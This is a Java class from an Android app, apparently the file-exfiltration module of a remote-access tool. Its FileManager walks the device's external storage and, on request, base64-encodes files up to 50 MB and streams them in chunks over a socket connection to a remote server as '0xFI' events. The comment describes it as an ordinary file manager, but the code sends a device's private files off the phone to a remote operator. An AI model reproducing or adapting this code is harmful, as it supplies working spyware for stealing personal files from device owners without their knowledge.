package com.fason.app.features.storage;

import android.os.Environment;
import android.util.Base64;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// File manager for browsing and downloading
public class FileManager {

    private static final int MAX_SIZE = 50 * 1024 * 1024;
    private static final int CHUNK_SIZE = 100 * 1024;
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();

    // Walk directory
    public JSONArray walk(String path) {
        JSONArray arr = new JSONArray();

        try {
            if (path == null || path.isEmpty()) {
                path = Environment.getExternalStorageDirectory().getAbsolutePath();
            }

            File dir = new File(path);
            if (!dir.exists() || !dir.canRead()) {
                sendError("Access denied", path);
                return arr;
            }

            // Parent directory
            if (dir.getParent() != null) {
                JSONObject p = new JSONObject();
                p.put("name", "../");
                p.put("isDir", true);
                p.put("path", dir.getParent());
                arr.put(p);
            }

            File[] files = dir.listFiles();
            if (files != null) {
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                for (File f : files) {
                    if (f.getName().startsWith(".")) continue;

                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("isDir", f.isDirectory());
                    obj.put("path", f.getAbsolutePath());
                    obj.put("size", f.length());
                    obj.put("lastModified", f.lastModified());
                    arr.put(obj);
                }
            }
        } catch (Exception ignored) {}

        return arr;
    }

    // Download file
    public void downloadFile(String path) {
        if (path == null) return;

        exec.execute(() -> {
            File file = new File(path);

            if (!file.exists()) { sendError("Not found", path); return; }
            if (!file.canRead()) { sendError("Cannot read", path); return; }

            long size = file.length();
            if (size > MAX_SIZE) { sendError("Too large (max 50MB)", path); return; }
            if (size == 0) { sendError("Empty file", path); return; }

            try {
                byte[] data = readFile(file);
                if (data == null) { sendError("Read failed", path); return; }

                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);

                if (b64.length() > 200 * 1024) {
                    sendChunked(file.getName(), b64, path);
                } else {
                    JSONObject obj = new JSONObject();
                    obj.put("type", "download");
                    obj.put("name", file.getName());
                    obj.put("buffer", b64);
                    obj.put("path", path);
                    obj.put("size", data.length);
                    SocketClient.getInstance().getSocket().emit("0xFI", obj);
                }
            } catch (OutOfMemoryError e) {
                sendError("Out of memory", path);
            } catch (Exception e) {
                sendError("Error: " + e.getMessage(), path);
            }
        });
    }

    // Read file
    private byte[] readFile(File file) {
        try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
            byte[] data = new byte[(int) file.length()];
            int read, total = 0;
            while ((read = bis.read(data, total, data.length - total)) > 0) {
                total += read;
            }
            return total == data.length ? data : null;
        } catch (Exception e) {
            return null;
        }
    }

    // Send chunked
    private void sendChunked(String name, String b64, String path) {
        try {
            int chunks = (int) Math.ceil((double) b64.length() / CHUNK_SIZE);
            String id = "t_" + System.currentTimeMillis();

            JSONObject start = new JSONObject();
            start.put("type", "download_start");
            start.put("transferId", id);
            start.put("name", name);
            start.put("path", path);
            start.put("totalChunks", chunks);
            start.put("totalSize", b64.length());
            SocketClient.getInstance().getSocket().emit("0xFI", start);

            for (int i = 0; i < chunks; i++) {
                int s = i * CHUNK_SIZE;
                int e = Math.min(s + CHUNK_SIZE, b64.length());

                JSONObject chunk = new JSONObject();
                chunk.put("type", "download_chunk");
                chunk.put("transferId", id);
                chunk.put("chunkIndex", i);
                chunk.put("chunkData", b64.substring(s, e));
                SocketClient.getInstance().getSocket().emit("0xFI", chunk);

                Thread.sleep(20);
            }

            JSONObject end = new JSONObject();
            end.put("type", "download_end");
            end.put("transferId", id);
            SocketClient.getInstance().getSocket().emit("0xFI", end);

        } catch (Exception ignored) {}
    }

    // Send error
    private void sendError(String msg, String path) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", "error");
            err.put("error", msg);
            if (path != null) err.put("path", path);
            SocketClient.getInstance().getSocket().emit("0xFI", err);
        } catch (Exception ignored) {}
    }
}
